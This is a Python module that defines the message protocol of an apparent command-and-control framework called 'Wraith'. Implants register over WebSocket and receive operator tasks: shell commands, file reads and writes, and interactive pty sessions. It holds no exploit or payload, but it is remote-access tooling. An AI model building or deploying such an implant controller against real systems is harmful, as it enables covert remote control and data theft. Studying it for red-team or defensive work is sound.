"""
Wraith wire protocol — JSON over WebSocket, one object per text frame.

Client (implant) -> Server:
  register : {"type":"register","implant":"go","os":"linux","arch":"amd64","user":"u","host":"h"}
  result   : {"type":"result","task_id":"<id>","ok":true,"out":"..."}
             file results carry {"part":i,"parts":k,"data":"<b64>","done":bool}
  pty_out  : {"type":"pty_out","data":"<b64>"}          (while a pty is open)
  beat     : {"type":"beat","ts":1699999999.0}          (optional)
  bye      : {"type":"bye"}                              (optional, before close)

Server -> Client:
  welcome  : {"type":"welcome","session":"<uuid>","interval":30}
  task     : {"type":"task","task_id":"<id>","action":"shell|ping|die|read_file|write_file|pty_open"
              ,"argv":[...],"data":"<b64>","part":i,"parts":k}
  pty_in   : {"type":"pty_in","data":"<b64>"}           (operator keystrokes)
  pty_end  : {"type":"pty_end"}                          (close the pty, resume normal mode)
  die      : {"type":"die"}

Auth: listener may require a shared token passed as "?token=<t>" on the upgrade URL.
"""

import base64
import binascii
import json
import uuid

MAX_MESSAGE_BYTES = 1024 * 1024        # hard cap for any single WS frame
MAX_TASK_ARGUMENTS = 128               # max argv entries accepted from an operator
MAX_ARGV_ITEM_BYTES = 4096             # max length of a single argv entry
MAX_TASK_OUTPUT_BYTES = 512 * 1024     # clamp implant output before it hits the wire
MAX_FILE_BYTES = 10 * 1024 * 1024      # per-file transfer cap
FILE_CHUNK_BYTES = 256 * 1024          # raw bytes per file chunk
EXEC_TIMEOUT = 120                     # default wall clock for a shell task (seconds)

ACTIONS = ("shell", "ping", "die", "read_file", "write_file", "pty_open")
CLIENT_TYPES = ("register", "result", "pty_out", "beat", "bye")
SERVER_TYPES = ("welcome", "task", "pty_in", "pty_end", "die")

# Protocol tags — the handshake compatibility layer between listeners and payloads.
# A listener announces which protocol dialects it speaks; a payload announces the
# ones it does. They connect ONLY when both support a common tag, so a payload
# built for one wire dialect can never silently attach to a listener speaking
# another. In practice one (occasionally two) tags are used — capabilities of
# any size are allowed. Indexes may pin a module's tag via the "protocol" field.
PROTOCOL_TAG = "ws-json-async"            # this implementation's dialect
PROTOCOL_TAG_ALT = "ws-json-async+pty"    # same dialect, pty-capable payloads


def new_session_id():
    return str(uuid.uuid4())


def new_task_id():
    return uuid.uuid4().hex[:12]


def register_message(implant, os_name, arch, user, host, tags=None):
    msg = {
        "type": "register",
        "implant": str(implant)[:32],
        "os": str(os_name)[:32],
        "arch": str(arch)[:32],
        "user": str(user)[:64],
        "host": str(host)[:128],
    }
    if tags:
        clean = clean_tags(tags)
        if clean:
            msg["tags"] = clean
    return msg


def clean_tags(tags):
    """Normalize/validate a tag collection — lowercase short strings."""
    if isinstance(tags, str):
        tags = [tags]
    if not isinstance(tags, (list, tuple, set)):
        return []
    seen = []
    for t in tags:
        t = str(t).strip().lower()[:64]
        if t and t not in seen:
            seen.append(t)
    return seen


def welcome_message(session, interval, tags=None):
    msg = {"type": "welcome", "session": session, "interval": int(interval)}
    if tags:
        msg["tags"] = list(tags)
    return msg


def task_message(task_id, action, argv, data=None, part=None, parts=None):
    msg = {"type": "task", "task_id": task_id, "action": action, "argv": list(argv or [])}
    if data is not None:
        msg["data"] = data
    if part is not None:
        msg["part"] = part
    if parts is not None:
        msg["parts"] = parts
    return msg


def result_message(task_id, ok, out, part=None, parts=None, data=None, done=None):
    msg = {"type": "result", "task_id": task_id, "ok": bool(ok), "out": clamp_output(out)}
    if part is not None:
        msg["part"] = int(part)
    if parts is not None:
        msg["parts"] = int(parts)
    if data is not None:
        msg["data"] = data
    if done is not None:
        msg["done"] = bool(done)
    return msg


def beat_message(ts=None):
    return {"type": "beat", "ts": float(ts) if ts is not None else 0.0}


def die_message():
    return {"type": "die"}


def pty_out_message(data_b64):
    return {"type": "pty_out", "data": data_b64}


def pty_in_message(data_b64):
    return {"type": "pty_in", "data": data_b64}


def pty_end_message():
    return {"type": "pty_end"}


def b64_encode(data: bytes):
    return base64.b64encode(data).decode("ascii")


def b64_decode(text):
    try:
        return base64.b64decode(text, validate=True)
    except (binascii.Error, TypeError, ValueError):
        return None


def clamp_output(text):
    text = "" if text is None else str(text)
    if len(text) > MAX_TASK_OUTPUT_BYTES:
        cut = text[:MAX_TASK_OUTPUT_BYTES]
        return cut + f"\n… [output truncated at {MAX_TASK_OUTPUT_BYTES} bytes]"
    return text


def chunk_file(data: bytes):
    """Yield (part, parts, b64) for a file body."""
    parts = max(1, (len(data) + FILE_CHUNK_BYTES - 1) // FILE_CHUNK_BYTES)
    for i in range(parts):
        piece = data[i * FILE_CHUNK_BYTES:(i + 1) * FILE_CHUNK_BYTES]
        yield i, parts, b64_encode(piece)


def parse(raw):
    """Parse and shallow-validate one inbound frame. Returns dict or None."""
    if isinstance(raw, bytes):
        try:
            raw = raw.decode("utf-8", "replace")
        except Exception:
            return None
    if not isinstance(raw, str) or not raw or len(raw) > MAX_MESSAGE_BYTES:
        return None
    try:
        msg = json.loads(raw)
    except Exception:
        return None
    if not isinstance(msg, dict):
        return None
    t = msg.get("type")
    if not isinstance(t, str) or t not in CLIENT_TYPES:
        return None
    return msg


def sanitize_argv(argv):
    """Validate an operator-supplied argv before it becomes a task frame."""
    if not isinstance(argv, (list, tuple)) or not argv:
        return None
    if len(argv) > MAX_TASK_ARGUMENTS:
        return None
    clean = []
    for item in argv:
        item = "" if item is None else str(item)
        if len(item) > MAX_ARGV_ITEM_BYTES:
            return None
        clean.append(item)
    return clean


def shell_argv(command, target_os):
    """Wrap a raw operator command line for the target's default shell."""
    command = "" if command is None else str(command)
    if str(target_os).lower() == "windows":
        return ["cmd", "/c", command]
    return ["sh", "-c", command]


def describe():
    lines = [
        "WRAITH PROTOCOL — JSON over WebSocket, one object per text frame",
        "",
        f"  {'direction':<18} {'type':<10} fields",
        "  " + "-" * 78,
        "  implant -> server  register  implant, os, arch, user, host",
        "  implant -> server  result    task_id, ok, out | part,parts,data(b64),done",
        "  implant -> server  pty_out   data(b64)            (pty open)",
        "  implant -> server  beat      ts (optional)  ·  bye  (graceful)",
        "  server  -> implant welcome   session (uuid), interval",
        "  server  -> implant task      task_id, action, argv[] [, data, part, parts]",
        "                               action ∈ shell|ping|die|read_file|write_file|pty_open",
        "  server  -> implant pty_in    data(b64) keystrokes · pty_end close",
        "  server  -> implant die       —",
        "",
        "  auth       : shared token on the upgrade URL (?token=…)",
        f"  frame cap  : {MAX_MESSAGE_BYTES // (1024 * 1024)} MB · argv ≤ {MAX_TASK_ARGUMENTS}×{MAX_ARGV_ITEM_BYTES}B · out ≤ {MAX_TASK_OUTPUT_BYTES // 1024} KB",
        f"  file cap   : {MAX_FILE_BYTES // (1024 * 1024)} MB per file in {FILE_CHUNK_BYTES // 1024} KB base64 chunks",
        "  argv[0]    : 'sh' (posix) / 'cmd' (windows) — implant executes argv verbatim",
    ]
    return "\n".join(lines)
